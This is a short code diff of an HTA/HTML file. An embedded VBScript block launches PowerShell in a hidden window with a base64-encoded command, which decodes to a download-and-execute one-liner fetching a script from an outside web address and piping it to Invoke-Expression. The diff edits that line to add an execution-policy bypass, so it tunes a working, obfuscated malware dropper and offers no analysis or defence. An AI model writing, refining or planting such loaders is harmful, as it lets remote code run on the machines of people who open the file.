@@ -2,7 +2,7 @@
 <script language="VBScript">
 Dim shell
 Set shell = CreateObject("WScript.Shell")
-shell.Run "powershell -encodedCommand aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA==", 0
+shell.Run "powershell -executionpolicy bypass -e aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA", 0
 window.close
 </script>
 </html>
